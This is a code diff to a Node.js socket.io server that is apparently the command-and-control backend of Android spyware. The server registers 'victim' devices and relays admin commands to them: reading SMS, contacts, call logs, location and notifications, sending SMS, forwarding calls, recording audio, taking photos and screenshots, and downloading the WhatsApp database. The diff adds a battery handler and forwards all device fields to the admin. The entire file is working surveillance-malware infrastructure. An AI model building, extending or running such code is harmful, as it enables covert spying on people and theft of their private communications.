@@ -25,91 +25,98 @@ io.on('connection', (socket) => {
     socket.on('request', request);
     socket.on('join',(device)=>{
         log("Victim joined => "+JSON.stringify(device.id));
-        victimList[device.id] =  socket.id;
-        victimData[device.id]= {...device,socketId: socket.id};
-        deviceList[socket.id] =  {
-          "id":  device.id,
-          "model":  device.model
-        }
-        socket.broadcast.emit("join", {...device,socketId: socket.id});
-      });
+        victimList[device.id] = socket.id;
+        // ✅ Preserve ALL fields from device
+        victimData[device.id] = {
+            ...device,
+            socketId: socket.id
+        };
+        deviceList[socket.id] = {
+            "id": device.id,
+            "model": device.model
+        };
+        // ✅ Forward ALL fields to admin
+        socket.broadcast.emit("join", {...device, socketId: socket.id});
+    });
 
-      // Original Handlers
-      socket.on('getDir',(data)=>response("getDir",data));
-      socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
-      socket.on('getContacts',(data)=>response("getContacts",data));
-      socket.on('sendSMS',(data)=>response("sendSMS",data));
-      socket.on('getCallLog',(data)=>response("getCallLog",data));
-      socket.on("previewImage", (data) =>response("previewImage",data));
-      socket.on("error", (data) =>response("error",data));
-      socket.on("getSMS", (data) =>response("getSMS",data));
-      socket.on('getLocation',(data)=>response("getLocation",data));
-     
-      // Call Forward
-      socket.on('enableCallForward',(data)=>response("enableCallForward",data));
-      socket.on('disableCallForward',(data)=>response("disableCallForward",data));
-      socket.on('callForwardResult',(data)=>response("callForwardResult",data));
-      
-      // Voice Recording
-      socket.on('startRecording',(data)=>response("startRecording",data));
-      socket.on('stopRecording',(data)=>response("stopRecording",data));
-      socket.on('audioRecording',(data)=>response("audioRecording",data));
-      socket.on('audioRecordingStatus',(data)=>response("audioRecordingStatus",data));
-      
-      // Vibrate
-      socket.on('vibrate',(data)=>response("vibrate",data));
-      socket.on('vibrateResult',(data)=>response("vibrateResult",data));
-      
-      // Torch
-      socket.on('turnOnTorch',(data)=>response("turnOnTorch",data));
-      socket.on('turnOffTorch',(data)=>response("turnOffTorch",data));
-      socket.on('torchResult',(data)=>response("torchResult",data));
-      
-      // Camera
-      socket.on('takePicture',(data)=>response("takePicture",data));
-      socket.on('cameraCaptureResult',(data)=>response("cameraCaptureResult",data));
-      
-      // Screenshot
-      socket.on('takeScreenshot',(data)=>response("takeScreenshot",data));
-      socket.on('screenshotResult',(data)=>response("screenshotResult",data));
-      
-      // Notifications
-      socket.on('getNotifications',(data)=>response("getNotifications",data));
-      socket.on('notificationData',(data)=>response("notificationData",data));
+    // Original Handlers
+    socket.on('getDir',(data)=>response("getDir",data));
+    socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
+    socket.on('getContacts',(data)=>response("getContacts",data));
+    socket.on('sendSMS',(data)=>response("sendSMS",data));
+    socket.on('getCallLog',(data)=>response("getCallLog",data));
+    socket.on("previewImage", (data) =>response("previewImage",data));
+    socket.on("error", (data) =>response("error",data));
+    socket.on("getSMS", (data) =>response("getSMS",data));
+    socket.on('getLocation',(data)=>response("getLocation",data));
+   
+    // Battery Update
+    socket.on('batteryUpdate',(data)=>response("batteryUpdate",data));
+    
+    // Call Forward
+    socket.on('enableCallForward',(data)=>response("enableCallForward",data));
+    socket.on('disableCallForward',(data)=>response("disableCallForward",data));
+    socket.on('callForwardResult',(data)=>response("callForwardResult",data));
+    
+    // Voice Recording
+    socket.on('startRecording',(data)=>response("startRecording",data));
+    socket.on('stopRecording',(data)=>response("stopRecording",data));
+    socket.on('audioRecording',(data)=>response("audioRecording",data));
+    socket.on('audioRecordingStatus',(data)=>response("audioRecordingStatus",data));
+    
+    // Vibrate
+    socket.on('vibrate',(data)=>response("vibrate",data));
+    socket.on('vibrateResult',(data)=>response("vibrateResult",data));
+    
+    // Torch
+    socket.on('turnOnTorch',(data)=>response("turnOnTorch",data));
+    socket.on('turnOffTorch',(data)=>response("turnOffTorch",data));
+    socket.on('torchResult',(data)=>response("torchResult",data));
+    
+    // Camera
+    socket.on('takePicture',(data)=>response("takePicture",data));
+    socket.on('cameraCaptureResult',(data)=>response("cameraCaptureResult",data));
+    
+    // Screenshot
+    socket.on('takeScreenshot',(data)=>response("takeScreenshot",data));
+    socket.on('screenshotResult',(data)=>response("screenshotResult",data));
+    
+    // Notifications
+    socket.on('getNotifications',(data)=>response("getNotifications",data));
+    socket.on('notificationData',(data)=>response("notificationData",data));
 
-      socket.on('disconnect', () => {
+    socket.on('disconnect', () => {
         if(socket.id===adminSocketId){
             adminSocketId=null
         }else{
             response("disconnectClient",socket.id)
             Object.keys(victimList).map((key)=>{
                 if(victimList[key] === socket.id){
-                  delete victimList[key]
-                  delete victimData[key]
+                    delete victimList[key]
+                    delete victimData[key]
                 }
-              })
+            })
         }
     });
     
     socket.on("download", (d, callback) =>responseBinary("download", d, callback));
     socket.on("downloadWhatsappDatabase", (d, callback) => {
         socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
-       });
-
+    });
 });
 
 const request =(d)=>{
     let { to, action, data } = JSON.parse(d);
     log("Requesting action: "+ action);
     io.to(victimList[to]).emit(action, data);
-  }
+}
 
 const response =(action, data)=>{
     if(adminSocketId){
         log("response action: "+ action);
         io.to(adminSocketId).emit(action, data);
     }
-  }
+}
   
 const responseBinary =(action, data, callback)=>{
     if(adminSocketId){
@@ -117,8 +124,8 @@ const responseBinary =(action, data, callback)=>{
         callback("success")
         io.to(adminSocketId).emit(action, data);
     }
-  }
+}
 
 const log = (log) =>{
     console.log(log)
-  }
+}
